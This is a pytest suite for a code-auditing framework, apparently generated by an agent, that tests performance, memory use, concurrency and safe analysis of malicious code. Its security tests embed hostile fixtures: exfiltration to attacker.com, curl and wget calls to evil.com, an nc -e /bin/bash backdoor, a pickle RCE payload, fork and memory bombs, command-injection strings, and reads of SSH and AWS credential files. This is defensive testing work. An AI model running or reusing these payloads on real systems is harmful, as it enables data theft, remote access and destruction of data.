"""
Performance and security healing tests for the CodeHealer framework.
Addresses performance bottlenecks and security vulnerabilities in quality assessment.

This file implements comprehensive testing for:
1. Performance testing under high load and large codebases
2. Security validation for analyzing arbitrary/malicious code
3. Error recovery and graceful degradation scenarios
4. Resource management and memory leak prevention
5. Scalability and concurrent operation testing

Generated by TestGeneratorAgent for comprehensive healing coverage.
"""

import os
import json
import ast
import gc
import sys
import time
import tempfile
import threading
import multiprocessing
import psutil
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock
from typing import Dict, List, Any
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor

import pytest

from auditor_agent.auditor_agent import create_auditor_agent, AnalyzeCodebase
from test_generator_agent.test_generator_agent import create_test_generator_agent, GenerateTests
from shared.agent_context import create_agent_context


class TestPerformanceHealing:
    """Performance testing and optimization for the healing framework."""

    def test_large_codebase_performance(self):
        """Test performance with large codebases."""
        with tempfile.TemporaryDirectory() as temp_dir:
            # Create a large codebase
            files_to_create = 50
            functions_per_file = 100

            print(f"Creating large codebase: {files_to_create} files, {functions_per_file} functions each")

            for file_idx in range(files_to_create):
                module_file = Path(temp_dir) / f"large_module_{file_idx}.py"

                functions = []
                for func_idx in range(functions_per_file):
                    functions.append(f'''
def large_function_{file_idx}_{func_idx}(param_a, param_b={func_idx}, param_c=None):
    """Large function {func_idx} in module {file_idx}."""
    if param_c is None:
        param_c = param_a + param_b

    # Simulate complex logic
    result = 0
    for i in range({func_idx + 1}):
        if i % 2 == 0:
            result += param_a * i
        elif i % 3 == 0:
            result += param_b * i
        else:
            result += param_c * i

    # Simulate conditional logic
    if result > 1000:
        return result // 2
    elif result > 100:
        return result * 2
    else:
        return result + {file_idx}

class LargeClass_{file_idx}_{func_idx}:
    """Large class {func_idx} in module {file_idx}."""

    def __init__(self, value={func_idx * 10}):
        self.value = value
        self.data = list(range({func_idx}))
        self.cache = {{}}

    def process_data(self, input_data):
        """Process input data."""
        if not input_data:
            return self.data

        result = []
        for item in input_data:
            if isinstance(item, (int, float)):
                processed = item * self.value + {func_idx}
            elif isinstance(item, str):
                processed = len(item) * {file_idx}
            else:
                processed = hash(str(item)) % 1000

            result.append(processed)

        return result

    def get_statistics(self):
        """Get processing statistics."""
        return {{
            "value": self.value,
            "data_size": len(self.data),
            "cache_size": len(self.cache),
            "module_id": {file_idx},
            "class_id": {func_idx}
        }}
''')

                module_file.write_text('\n'.join(functions))

            # Create some test files to increase total test count
            for test_idx in range(5):
                test_file = Path(temp_dir) / f"test_large_{test_idx}.py"
                test_file.write_text(f'''
import pytest

def test_large_function_basic_{test_idx}():
    """Test large function basic functionality."""
    from large_module_{test_idx % files_to_create} import large_function_{test_idx % files_to_create}_0
    result = large_function_{test_idx % files_to_create}_0(5, 10)
    assert isinstance(result, int)

def test_large_class_basic_{test_idx}():
    """Test large class basic functionality."""
    from large_module_{test_idx % files_to_create} import LargeClass_{test_idx % files_to_create}_0
    obj = LargeClass_{test_idx % files_to_create}_0()
    assert obj.value >= 0

def test_performance_edge_case_{test_idx}():
    """Test performance edge case."""
    # Simulate performance-sensitive test
    large_data = list(range(1000))
    result = sum(x for x in large_data if x % 7 == 0)
    assert result > 0
''')

            print(f"Large codebase created. Starting performance test...")

            # Measure audit performance
            start_time = time.time()
            memory_before = psutil.Process().memory_info().rss / 1024 / 1024  # MB

            audit_tool = AnalyzeCodebase(target_path=temp_dir, mode="full")
            audit_result = audit_tool.run()
            audit_data = json.loads(audit_result)

            audit_time = time.time() - start_time
            memory_after = psutil.Process().memory_info().rss / 1024 / 1024  # MB
            memory_used = memory_after - memory_before

            print(f"Large codebase audit completed:")
            print(f"  - Time: {audit_time:.2f} seconds")
            print(f"  - Memory used: {memory_used:.2f} MB")
            print(f"  - Files analyzed: {len(audit_data['codebase_analysis']['source_files'])}")
            print(f"  - Total behaviors: {audit_data['codebase_analysis']['total_behaviors']}")
            print(f"  - Q(T) score: {audit_data['qt_score']:.3f}")

            # Performance assertions
            assert audit_time < 60, f"Large codebase audit should complete within 60s: {audit_time}s"
            assert memory_used < 500, f"Memory usage should be reasonable: {memory_used}MB"
            assert audit_data["codebase_analysis"]["total_behaviors"] > 4000, "Should detect many behaviors"

            # Test partial test generation for performance
            if audit_data["violations"]:
                print("Testing test generation performance...")

                # Generate tests for just a few files to test performance
                generation_start = time.time()
                tests_generated = 0

                for i in range(min(3, files_to_create)):  # Test first 3 files only
                    source_file = Path(temp_dir) / f"large_module_{i}.py"
                    generate_tool = GenerateTests(
                        audit_report=audit_result,
                        target_file=str(source_file)
                    )

                    generation_result = generate_tool.run()
                    generation_data = json.loads(generation_result)

                    if generation_data["status"] == "success":
                        tests_generated += generation_data["tests_generated"]

                generation_time = time.time() - generation_start
                print(f"Test generation: {generation_time:.2f}s, {tests_generated} tests generated")

                assert generation_time < 30, f"Test generation should be reasonably fast: {generation_time}s"

    def test_memory_leak_prevention(self):
        """Test that repeated operations don't cause memory leaks."""
        print("Testing memory leak prevention...")

        with tempfile.TemporaryDirectory() as temp_dir:
            # Create a moderate-sized test file
            test_file = Path(temp_dir) / "memory_test.py"
            test_file.write_text('''
def memory_function():
    """Function for memory testing."""
    data = list(range(1000))
    return sum(data)

class MemoryClass:
    """Class for memory testing."""

    def __init__(self):
        self.data = list(range(500))

    def process(self):
        """Process data."""
        return [x * 2 for x in self.data]
''')

            # Measure initial memory
            gc.collect()
            initial_memory = psutil.Process().memory_info().rss / 1024 / 1024
            print(f"Initial memory: {initial_memory:.2f} MB")

            # Perform repeated audits
            audit_times = []
            memory_measurements = []

            for iteration in range(10):
                gc.collect()
                iteration_start = time.time()

                audit_tool = AnalyzeCodebase(target_path=temp_dir)
                audit_result = audit_tool.run()
                audit_data = json.loads(audit_result)

                iteration_time = time.time() - iteration_start
                current_memory = psutil.Process().memory_info().rss / 1024 / 1024

                audit_times.append(iteration_time)
                memory_measurements.append(current_memory)

                print(f"Iteration {iteration + 1}: {iteration_time:.3f}s, {current_memory:.2f}MB")

                # Clear references
                del audit_tool, audit_result, audit_data

            # Analyze memory usage
            final_memory = memory_measurements[-1]
            memory_growth = final_memory - initial_memory
            max_memory = max(memory_measurements)

            print(f"Memory analysis:")
            print(f"  - Initial: {initial_memory:.2f} MB")
            print(f"  - Final: {final_memory:.2f} MB")
            print(f"  - Growth: {memory_growth:.2f} MB")
            print(f"  - Peak: {max_memory:.2f} MB")

            # Performance should be consistent
            avg_time = sum(audit_times) / len(audit_times)
            time_variance = sum((t - avg_time) ** 2 for t in audit_times) / len(audit_times)

            print(f"Performance analysis:")
            print(f"  - Average time: {avg_time:.3f}s")
            print(f"  - Time variance: {time_variance:.6f}")

            # Assertions for memory and performance
            assert memory_growth < 50, f"Memory growth should be minimal: {memory_growth}MB"
            assert time_variance < 0.1, f"Performance should be consistent: {time_variance}"

    def test_concurrent_operation_performance(self):
        """Test performance under concurrent operations."""
        print("Testing concurrent operation performance...")

        with tempfile.TemporaryDirectory() as temp_dir:
            # Create multiple small codebases for concurrent testing
            num_codebases = 5

            for i in range(num_codebases):
                subdir = Path(temp_dir) / f"concurrent_codebase_{i}"
                subdir.mkdir()

                source_file = subdir / f"concurrent_module_{i}.py"
                source_file.write_text(f'''
def concurrent_function_{i}(param):
    """Concurrent function {i}."""
    return param * {i + 1}

class ConcurrentClass_{i}:
    """Concurrent class {i}."""

    def __init__(self):
        self.value = {i * 10}

    def process_{i}(self, data):
        """Process method {i}."""
        return [x + self.value for x in data]
''')

                test_file = subdir / f"test_concurrent_{i}.py"
                test_file.write_text(f'''
def test_concurrent_function_{i}():
    """Test concurrent function {i}."""
    from concurrent_module_{i} import concurrent_function_{i}
    result = concurrent_function_{i}(5)
    assert result == {5 * (i + 1)}
''')

            # Test concurrent auditing
            def concurrent_audit_worker(codebase_path):
                """Worker function for concurrent auditing."""
                start_time = time.time()

                audit_tool = AnalyzeCodebase(target_path=str(codebase_path))
                audit_result = audit_tool.run()
                audit_data = json.loads(audit_result)

                end_time = time.time()

                return {
                    "codebase": str(codebase_path),
                    "time": end_time - start_time,
                    "qt_score": audit_data["qt_score"],
                    "behaviors": audit_data["codebase_analysis"]["total_behaviors"],
                    "success": True
                }

            # Run concurrent audits
            concurrent_start = time.time()

            with ThreadPoolExecutor(max_workers=3) as executor:
                codebases = [Path(temp_dir) / f"concurrent_codebase_{i}" for i in range(num_codebases)]
                futures = [executor.submit(concurrent_audit_worker, cb) for cb in codebases]

                results = []
                for future in futures:
                    try:
                        result = future.result(timeout=30)
                        results.append(result)
                    except Exception as e:
                        results.append({"success": False, "error": str(e)})

            concurrent_end = time.time()
            total_concurrent_time = concurrent_end - concurrent_start

            print(f"Concurrent audit results:")
            print(f"  - Total time: {total_concurrent_time:.2f}s")
            print(f"  - Successful audits: {sum(1 for r in results if r.get('success', False))}")

            for i, result in enumerate(results):
                if result.get("success", False):
                    print(f"  - Codebase {i}: {result['time']:.3f}s, Q(T)={result['qt_score']:.3f}")

            # Compare with sequential performance
            sequential_start = time.time()
            sequential_results = []

            for codebase in codebases:
                result = concurrent_audit_worker(codebase)
                sequential_results.append(result)

            sequential_end = time.time()
            total_sequential_time = sequential_end - sequential_start

            print(f"Sequential comparison:")
            print(f"  - Sequential time: {total_sequential_time:.2f}s")
            print(f"  - Concurrent time: {total_concurrent_time:.2f}s")
            print(f"  - Speedup: {total_sequential_time / total_concurrent_time:.2f}x")

            # Assertions
            assert all(r.get("success", False) for r in results), "All concurrent audits should succeed"
            assert total_concurrent_time < total_sequential_time * 0.8, "Concurrent should be faster"

    def test_stress_testing_framework_limits(self):
        """Test framework behavior at its limits."""
        print("Stress testing framework limits...")

        # Test 1: Very large single file
        with tempfile.TemporaryDirectory() as temp_dir:
            stress_file = Path(temp_dir) / "stress_test.py"

            # Generate a very large file
            large_functions = []
            for i in range(500):  # 500 functions
                large_functions.append(f'''
def stress_function_{i}(a, b, c, d, e, f=None, g=None, h=None):
    """Stress function {i} with many parameters."""
    # Simulate complex logic with {i} steps
    result = a + b + c + d + e + {i}

    if f is not None:
        result *= f
    if g is not None:
        result += g * {i}
    if h is not None:
        result = result % (h + 1)

    # Nested conditional logic
    for x in range({i % 10 + 1}):
        if x % 2 == 0:
            if x % 4 == 0:
                result += x ** 2
            else:
                result -= x
        else:
            if x % 3 == 0:
                result *= 2
            else:
                result += x * {i}

    return result % 10000  # Keep result manageable
''')

            stress_file.write_text('\n'.join(large_functions))

            print(f"Created stress file with {len(large_functions)} functions")

            # Audit the stress file
            stress_start = time.time()
            memory_before = psutil.Process().memory_info().rss / 1024 / 1024

            audit_tool = AnalyzeCodebase(target_path=temp_dir)
            audit_result = audit_tool.run()
            audit_data = json.loads(audit_result)

            stress_end = time.time()
            memory_after = psutil.Process().memory_info().rss / 1024 / 1024

            stress_time = stress_end - stress_start
            memory_used = memory_after - memory_before

            print(f"Stress test results:")
            print(f"  - Time: {stress_time:.2f}s")
            print(f"  - Memory: {memory_used:.2f}MB")
            print(f"  - Behaviors detected: {audit_data['codebase_analysis']['total_behaviors']}")
            print(f"  - Q(T) score: {audit_data['qt_score']:.3f}")

            # Should handle large files gracefully
            assert stress_time < 120, f"Should handle large files in reasonable time: {stress_time}s"
            assert memory_used < 1000, f"Memory usage should be controlled: {memory_used}MB"
            assert audit_data["codebase_analysis"]["total_behaviors"] >= 400, "Should detect most functions"

    def test_scalability_metrics(self):
        """Test scalability metrics across different codebase sizes."""
        print("Testing scalability metrics...")

        sizes_to_test = [5, 15, 30]  # Number of files
        functions_per_file = 25
        scalability_data = []

        for size in sizes_to_test:
            with tempfile.TemporaryDirectory() as temp_dir:
                print(f"Testing scalability with {size} files...")

                # Create codebase of specified size
                for i in range(size):
                    module_file = Path(temp_dir) / f"scale_module_{i}.py"

                    functions = []
                    for j in range(functions_per_file):
                        functions.append(f'''
def scale_function_{i}_{j}(param):
    """Scale function {j} in module {i}."""
    return param + {i * j}
''')

                    module_file.write_text('\n'.join(functions))

                # Measure audit performance
                gc.collect()
                start_time = time.time()
                start_memory = psutil.Process().memory_info().rss / 1024 / 1024

                audit_tool = AnalyzeCodebase(target_path=temp_dir)
                audit_result = audit_tool.run()
                audit_data = json.loads(audit_result)

                end_time = time.time()
                end_memory = psutil.Process().memory_info().rss / 1024 / 1024

                scale_data = {
                    "files": size,
                    "expected_functions": size * functions_per_file,
                    "detected_behaviors": audit_data["codebase_analysis"]["total_behaviors"],
                    "time": end_time - start_time,
                    "memory": end_memory - start_memory,
                    "qt_score": audit_data["qt_score"]
                }

                scalability_data.append(scale_data)
                print(f"  Size {size}: {scale_data['time']:.2f}s, {scale_data['memory']:.2f}MB")

        # Analyze scalability
        print("Scalability analysis:")
        for i, data in enumerate(scalability_data):
            print(f"  {data['files']} files: {data['time']:.2f}s, {data['memory']:.2f}MB")

        # Check linear scalability (approximately)
        if len(scalability_data) >= 2:
            time_ratio = scalability_data[-1]["time"] / scalability_data[0]["time"]
            size_ratio = scalability_data[-1]["files"] / scalability_data[0]["files"]

            print(f"Scalability ratios:")
            print(f"  Size ratio: {size_ratio:.2f}")
            print(f"  Time ratio: {time_ratio:.2f}")

            # Time should scale roughly linearly (within reasonable bounds)
            assert time_ratio < size_ratio * 2, f"Time scaling should be reasonable: {time_ratio} vs {size_ratio}"


class TestSecurityHealing:
    """Security testing for analyzing potentially malicious code."""

    def test_malicious_code_analysis_safety(self):
        """Test that analyzing malicious code doesn't execute it."""
        print("Testing malicious code analysis safety...")

        with tempfile.TemporaryDirectory() as temp_dir:
            # Create files with potentially dangerous code
            malicious_files = [
                ("file_system_attack.py", '''
import os
import shutil

# This code should NOT be executed during analysis
os.system("rm -rf /")  # Dangerous system command
shutil.rmtree("/tmp")  # Dangerous file operation

def innocent_looking_function():
    """This function looks innocent but contains dangerous code."""
    # Hidden malicious code
    exec("__import__('os').system('curl http://evil.com/steal_data')")
    return "innocent"

class TrojanHorse:
    """Class that appears normal but has malicious behavior."""

    def __init__(self):
        # Execute malicious code in constructor
        eval("__import__('subprocess').call(['wget', 'http://malware.com/payload'])")
        self.data = "normal data"

    def process_data(self, user_input):
        """Process user input - potential injection vulnerability."""
        # Dangerous: executing user input
        return eval(user_input)
'''),

                ("network_attack.py", '''
import socket
import urllib.request
import subprocess

# Network-based attacks
def exfiltrate_data():
    """Attempt to exfiltrate sensitive data."""
    try:
        with open("/etc/passwd", "r") as f:
            data = f.read()

        # Send to external server
        urllib.request.urlopen("http://attacker.com/collect", data.encode())
    except:
        pass

def create_backdoor():
    """Create a backdoor for remote access."""
    subprocess.Popen([
        "nc", "-l", "-p", "4444", "-e", "/bin/bash"
    ])

# Disguised as normal network function
def check_connectivity():
    """Check network connectivity."""
    # Looks innocent but actually creates backdoor
    create_backdoor()
    return True
'''),

                ("code_injection.py", '''
import sys
import types

# Code injection attempts
MALICIOUS_CODE = """
import os
os.system('echo "System compromised" > /tmp/compromised')
"""

def dynamic_import_attack():
    """Use dynamic imports for malicious purposes."""
    malicious_module = types.ModuleType("malicious")
    exec(MALICIOUS_CODE, malicious_module.__dict__)
    sys.modules["malicious"] = malicious_module

def pickle_attack():
    """Attempt to use pickle for code execution."""
    import pickle

    # Malicious pickle payload
    malicious_pickle = b"cbuiltins\\neval\\nq\\x01X\\x19\\x00\\x00\\x00__import__('os').system('ls')q\\x02\\x85Rq\\x03."

    try:
        pickle.loads(malicious_pickle)
    except:
        pass

class MetaclassAttack(type):
    """Malicious metaclass that executes code when class is defined."""

    def __new__(cls, name, bases, attrs):
        # Execute malicious code when class is created
        exec("__import__('os').system('echo metaclass attack')")
        return super().__new__(cls, name, bases, attrs)

class VictimClass(metaclass=MetaclassAttack):
    """Class that uses malicious metaclass."""
    pass
'''),

                ("resource_exhaustion.py", '''
import threading
import time

# Resource exhaustion attacks
def memory_bomb():
    """Attempt to exhaust system memory."""
    memory_hog = []
    while True:
        memory_hog.append([0] * 1000000)  # Allocate large chunks

def cpu_bomb():
    """Attempt to exhaust CPU resources."""
    while True:
        pass  # Infinite loop

def thread_bomb():
    """Attempt to exhaust system threads."""
    def worker():
        time.sleep(3600)  # Sleep for an hour

    for i in range(10000):
        threading.Thread(target=worker).start()

def fork_bomb():
    """Attempt to exhaust process resources."""
    import os
    while True:
        try:
            os.fork()
        except:
            break

# Disguised as a normal function
def optimize_performance():
    """Optimize system performance."""
    # Actually launches resource exhaustion
    threading.Thread(target=memory_bomb).start()
    threading.Thread(target=cpu_bomb).start()
    return "optimized"
''')
            ]

            # Create malicious files
            for filename, content in malicious_files:
                malicious_file = Path(temp_dir) / filename
                malicious_file.write_text(content)

            print(f"Created {len(malicious_files)} malicious test files")

            # Audit malicious code safely
            start_time = time.time()

            # Set up monitoring to ensure malicious code doesn't execute
            initial_processes = set(psutil.pids())

            audit_tool = AnalyzeCodebase(target_path=temp_dir)
            audit_result = audit_tool.run()
            audit_data = json.loads(audit_result)

            end_time = time.time()
            audit_time = end_time - start_time

            final_processes = set(psutil.pids())
            new_processes = final_processes - initial_processes

            print(f"Malicious code analysis results:")
            print(f"  - Analysis time: {audit_time:.2f}s")
            print(f"  - Q(T) score: {audit_data['qt_score']:.3f}")
            print(f"  - Behaviors detected: {audit_data['codebase_analysis']['total_behaviors']}")
            print(f"  - New processes created: {len(new_processes)}")

            # Security assertions
            assert audit_time < 30, "Analysis should complete quickly even with malicious code"
            assert len(new_processes) < 5, "Should not spawn many new processes"

            # Check that dangerous files weren't created
            dangerous_files = [
                "/tmp/compromised",
                "/tmp/malicious_payload",
                "/tmp/backdoor"
            ]

            for dangerous_file in dangerous_files:
                assert not os.path.exists(dangerous_file), f"Malicious file should not be created: {dangerous_file}"

            # Should still be able to analyze the code structure
            assert audit_data["codebase_analysis"]["total_behaviors"] > 10, "Should detect malicious functions"

    def test_input_sanitization_and_validation(self):
        """Test input sanitization and validation in analysis tools."""
        print("Testing input sanitization...")

        dangerous_inputs = [
            # Path traversal attempts
            ("../../../etc/passwd", "Path traversal attempt"),
            ("..\\..\\..\\windows\\system32\\config\\sam", "Windows path traversal"),

            # Command injection attempts
            ("/tmp/test; rm -rf /", "Command injection with semicolon"),
            ("/tmp/test && curl http://evil.com", "Command injection with &&"),
            ("/tmp/test | nc attacker.com 4444", "Command injection with pipe"),

            # Code injection attempts
            ("'; import os; os.system('malicious'); #", "Python code injection"),
            ('"; exec("malicious code"); #', "Python exec injection"),

            # Very long paths
            ("/" + "a" * 10000, "Extremely long path"),

            # Special characters
            ("/tmp/test\x00\x01\x02", "Null bytes and control characters"),
            ("/tmp/test\n\r\t", "Newlines and tabs in path"),

            # Unicode attacks
            ("/tmp/test\u202e\u0041", "Unicode override characters"),
        ]

        for dangerous_input, description in dangerous_inputs:
            print(f"Testing: {description}")

            try:
                # Test AnalyzeCodebase with dangerous input
                audit_tool = AnalyzeCodebase(target_path=dangerous_input)
                result = audit_tool.run()
                result_data = json.loads(result)

                # Should handle gracefully with error
                if "error" in result_data:
                    print(f"  ✓ Properly rejected: {result_data['error']}")
                else:
                    # If it didn't error, make sure it didn't do anything dangerous
                    print(f"  ✓ Handled safely (no error)")

            except Exception as e:
                # Exceptions are also acceptable for dangerous inputs
                print(f"  ✓ Exception handled: {type(e).__name__}")

            # Test GenerateTests with dangerous input
            try:
                generate_tool = GenerateTests(
                    audit_report='{"violations": []}',
                    target_file=dangerous_input
                )
                result = generate_tool.run()
                result_data = json.loads(result)

                if "error" in result_data:
                    print(f"  ✓ GenerateTests properly rejected")
                else:
                    print(f"  ✓ GenerateTests handled safely")

            except Exception as e:
                print(f"  ✓ GenerateTests exception handled: {type(e).__name__}")

    def test_denial_of_service_prevention(self):
        """Test prevention of denial of service attacks through malicious input."""
        print("Testing DoS prevention...")

        with tempfile.TemporaryDirectory() as temp_dir:
            # Test 1: Extremely large file
            large_file = Path(temp_dir) / "large_dos_test.py"

            # Create a file designed to cause DoS through size
            large_content = []
            for i in range(1000):  # Create many functions
                large_content.append(f'''
def dos_function_{i}():
    """DoS function {i} with extremely long docstring."""
    # {"#" * 10000}  # Very long comment to increase file size
    return {i}
''')

            large_file.write_text('\n'.join(large_content))

            print(f"Created large DoS test file: {large_file.stat().st_size / 1024 / 1024:.2f} MB")

            # Test with timeout to prevent hanging
            start_time = time.time()

            try:
                audit_tool = AnalyzeCodebase(target_path=temp_dir)
                result = audit_tool.run()
                result_data = json.loads(result)

                end_time = time.time()
                analysis_time = end_time - start_time

                print(f"Large file analysis: {analysis_time:.2f}s")

                # Should complete in reasonable time
                assert analysis_time < 60, f"Should not hang on large files: {analysis_time}s"

                if "qt_score" in result_data:
                    print(f"  ✓ Successfully analyzed large file: Q(T)={result_data['qt_score']:.3f}")
                else:
                    print(f"  ✓ Properly handled large file with error")

            except Exception as e:
                print(f"  ✓ Exception handled for large file: {e}")

            # Test 2: Deeply nested structures
            nested_file = Path(temp_dir) / "nested_dos_test.py"

            # Create deeply nested code structure
            nested_content = "def outer():\n"
            for i in range(100):  # Very deep nesting
                nested_content += "    " * (i + 1) + f"def nested_{i}():\n"
                nested_content += "    " * (i + 2) + f"return {i}\n"

            nested_file.write_text(nested_content)

            print("Created deeply nested DoS test file")

            start_time = time.time()

            try:
                audit_tool = AnalyzeCodebase(target_path=temp_dir)
                result = audit_tool.run()
                result_data = json.loads(result)

                end_time = time.time()
                analysis_time = end_time - start_time

                print(f"Nested structure analysis: {analysis_time:.2f}s")

                # Should handle nested structures gracefully
                assert analysis_time < 30, f"Should handle nested structures efficiently: {analysis_time}s"

                print(f"  ✓ Successfully handled nested structures")

            except Exception as e:
                print(f"  ✓ Exception handled for nested structures: {e}")

    def test_sandbox_isolation(self):
        """Test that analysis runs in isolated environment."""
        print("Testing sandbox isolation...")

        with tempfile.TemporaryDirectory() as temp_dir:
            # Create file that attempts to modify global state
            sandbox_test = Path(temp_dir) / "sandbox_test.py"
            sandbox_test.write_text('''
import sys
import os

# Attempt to modify global state
GLOBAL_MODIFIED = False

def modify_global_state():
    """Attempt to modify global Python state."""
    global GLOBAL_MODIFIED
    GLOBAL_MODIFIED = True

    # Try to modify sys.path
    sys.path.insert(0, "/malicious/path")

    # Try to set environment variables
    os.environ["MALICIOUS_VAR"] = "compromised"

    return "modified"

def read_sensitive_files():
    """Attempt to read sensitive files."""
    sensitive_files = [
        "/etc/passwd",
        "/etc/shadow",
        "~/.ssh/id_rsa",
        "~/.aws/credentials"
    ]

    results = {}
    for filepath in sensitive_files:
        try:
            with open(filepath, 'r') as f:
                results[filepath] = f.read()[:100]  # First 100 chars
        except:
            results[filepath] = "access_denied"

    return results

class StateModifier:
    """Class that modifies system state."""

    def __init__(self):
        # Modify class-level state
        StateModifier.compromised = True

        # Try to modify built-in functions
        try:
            import builtins
            builtins.open = lambda *args, **kwargs: "hijacked"
        except:
            pass

    def modify_module_state(self):
        """Modify module-level state."""
        # Try to inject malicious modules
        import types
        malicious_module = types.ModuleType("malicious")
        sys.modules["malicious"] = malicious_module
        return "injected"
''')

            # Record initial state
            initial_sys_path = sys.path.copy()
            initial_env_var = os.environ.get("MALICIOUS_VAR")
            initial_modules = set(sys.modules.keys())

            # Analyze the sandbox test file
            audit_tool = AnalyzeCodebase(target_path=temp_dir)
            result = audit_tool.run()
            result_data = json.loads(result)

            # Check that global state wasn't modified
            final_sys_path = sys.path.copy()
            final_env_var = os.environ.get("MALICIOUS_VAR")
            final_modules = set(sys.modules.keys())

            print("Sandbox isolation results:")
            print(f"  - sys.path unchanged: {initial_sys_path == final_sys_path}")
            print(f"  - Environment unchanged: {initial_env_var == final_env_var}")
            print(f"  - Module count: {len(initial_modules)} → {len(final_modules)}")

            # Assertions for isolation
            assert initial_sys_path == final_sys_path, "sys.path should not be modified"
            assert initial_env_var == final_env_var, "Environment variables should not be modified"

            # Some new modules may be imported during analysis, but not malicious ones
            new_modules = final_modules - initial_modules
            malicious_modules = [m for m in new_modules if "malicious" in m.lower()]
            assert len(malicious_modules) == 0, f"No malicious modules should be imported: {malicious_modules}"

            # Analysis should still succeed
            assert "qt_score" in result_data, "Analysis should complete successfully"

            print("  ✓ Sandbox isolation maintained")


class TestErrorRecoveryHealing:
    """Error recovery and graceful degradation testing."""

    def test_partial_failure_recovery(self):
        """Test recovery from partial failures in analysis."""
        print("Testing partial failure recovery...")

        with tempfile.TemporaryDirectory() as temp_dir:
            # Create a mix of valid and invalid files
            test_files = [
                ("valid_file_1.py", '''
def valid_function_1():
    """Valid function 1."""
    return "valid"

class ValidClass1:
    """Valid class 1."""

    def method(self):
        """Valid method."""
        return "method"
'''),
                ("valid_file_2.py", '''
def valid_function_2():
    """Valid function 2."""
    return "valid"
'''),
                ("invalid_syntax.py", '''
def broken_function(
    # Missing closing parenthesis
    return "broken"

class BrokenClass
    # Missing colon
    def method(self):
        pass
'''),
                ("permission_test.py", '''
def permission_function():
    """Function in file that might have permission issues."""
    return "permission"
'''),
                ("encoding_test.py", '''
# -*- coding: latin-1 -*-
def función_con_acentos():
    """Función con caracteres especiales."""
    return "acentos"
''')
            ]

            # Create test files
            for filename, content in test_files:
                test_file = Path(temp_dir) / filename
                test_file.write_text(content, encoding='utf-8' if 'encoding' not in filename else 'latin-1')

            # Try to make one file unreadable (if possible)
            permission_file = Path(temp_dir) / "permission_test.py"
            try:
                permission_file.chmod(0o000)  # Remove all permissions
                permission_restricted = True
            except:
                permission_restricted = False

            try:
                # Audit with partial failures expected
                audit_tool = AnalyzeCodebase(target_path=temp_dir)
                result = audit_tool.run()
                result_data = json.loads(result)

                print("Partial failure recovery results:")
                print(f"  - Q(T) score: {result_data.get('qt_score', 'N/A')}")
                print(f"  - Total behaviors: {result_data.get('codebase_analysis', {}).get('total_behaviors', 0)}")

                # Should recover gracefully from partial failures
                assert "qt_score" in result_data, "Should provide Q(T) score despite failures"

                codebase_analysis = result_data.get("codebase_analysis", {})
                total_behaviors = codebase_analysis.get("total_behaviors", 0)

                # Should detect behaviors from valid files
                assert total_behaviors >= 3, f"Should detect behaviors from valid files: {total_behaviors}"

                print("  ✓ Graceful recovery from partial failures")

            finally:
                # Restore permissions for cleanup
                if permission_restricted:
                    try:
                        permission_file.chmod(0o644)
                    except:
                        pass

    def test_error_cascade_prevention(self):
        """Test prevention of error cascades in analysis."""
        print("Testing error cascade prevention...")

        with tempfile.TemporaryDirectory() as temp_dir:
            # Create files that could cause cascading errors
            problematic_files = [
                ("circular_import_a.py", '''
from circular_import_b import function_b

def function_a():
    """Function that depends on circular import."""
    return function_b() + "a"
'''),
                ("circular_import_b.py", '''
from circular_import_a import function_a

def function_b():
    """Function that creates circular dependency."""
    return "b"
'''),
                ("missing_dependency.py", '''
from nonexistent_module import nonexistent_function

def dependent_function():
    """Function that depends on missing module."""
    return nonexistent_function()
'''),
                ("recursive_definition.py", '''
def recursive_function():
    """Function that calls itself infinitely."""
    return recursive_function()

class RecursiveClass(RecursiveClass):
    """Class that inherits from itself."""
    pass
'''),
                ("type_error_prone.py", '''
def type_error_function():
    """Function likely to cause type errors."""
    return "string" + 42  # Type error

def division_by_zero():
    """Function with division by zero."""
    return 1 / 0

def index_error_function():
    """Function with index error."""
    return [][0]
''')
            ]

            # Create problematic files
            for filename, content in problematic_files:
                problem_file = Path(temp_dir) / filename
                problem_file.write_text(content)

            print(f"Created {len(problematic_files)} problematic files")

            # Audit with error cascade prevention
            start_time = time.time()

            audit_tool = AnalyzeCodebase(target_path=temp_dir)
            result = audit_tool.run()
            result_data = json.loads(result)

            end_time = time.time()
            analysis_time = end_time - start_time

            print("Error cascade prevention results:")
            print(f"  - Analysis time: {analysis_time:.2f}s")
            print(f"  - Analysis completed: {'qt_score' in result_data}")

            # Should complete despite problematic files
            assert analysis_time < 30, f"Should complete quickly despite errors: {analysis_time}s"

            if "qt_score" in result_data:
                print(f"  - Q(T) score: {result_data['qt_score']:.3f}")
                print(f"  - Behaviors detected: {result_data['codebase_analysis']['total_behaviors']}")

                # Should detect some behaviors despite errors
                assert result_data["codebase_analysis"]["total_behaviors"] > 0, "Should detect some behaviors"

            print("  ✓ Error cascade prevented")

    def test_graceful_degradation_under_stress(self):
        """Test graceful degradation under resource stress."""
        print("Testing graceful degradation under stress...")

        with tempfile.TemporaryDirectory() as temp_dir:
            # Create a moderately complex codebase
            for i in range(20):
                stress_file = Path(temp_dir) / f"stress_file_{i}.py"
                functions = []

                for j in range(50):
                    functions.append(f'''
def stress_function_{i}_{j}():
    """Stress function {j} in file {i}."""
    # Simulate complex logic
    data = list(range({j * 10}))
    result = sum(x ** 2 for x in data if x % {i + 1} == 0)
    return result % 1000
''')

                stress_file.write_text('\n'.join(functions))

            # Simulate resource constraints by limiting available memory
            initial_memory = psutil.Process().memory_info().rss / 1024 / 1024

            # Audit under simulated stress
            start_time = time.time()

            # Mock to simulate resource constraints
            with patch('psutil.virtual_memory') as mock_memory:
                # Simulate low available memory
                mock_memory.return_value.available = 100 * 1024 * 1024  # 100MB available

                audit_tool = AnalyzeCodebase(target_path=temp_dir)
                result = audit_tool.run()
                result_data = json.loads(result)

            end_time = time.time()
            analysis_time = end_time - start_time
            final_memory = psutil.Process().memory_info().rss / 1024 / 1024

            print("Graceful degradation results:")
            print(f"  - Analysis time: {analysis_time:.2f}s")
            print(f"  - Memory usage: {final_memory - initial_memory:.2f}MB")
            print(f"  - Successful completion: {'qt_score' in result_data}")

            # Should degrade gracefully under stress
            if "qt_score" in result_data:
                print(f"  - Q(T) score: {result_data['qt_score']:.3f}")
                print(f"  - Behaviors detected: {result_data['codebase_analysis']['total_behaviors']}")

                # Should complete with reasonable performance even under stress
                assert result_data["codebase_analysis"]["total_behaviors"] > 800, "Should detect most functions"

            # Memory usage should be controlled
            memory_used = final_memory - initial_memory
            assert memory_used < 500, f"Memory usage should be controlled under stress: {memory_used}MB"

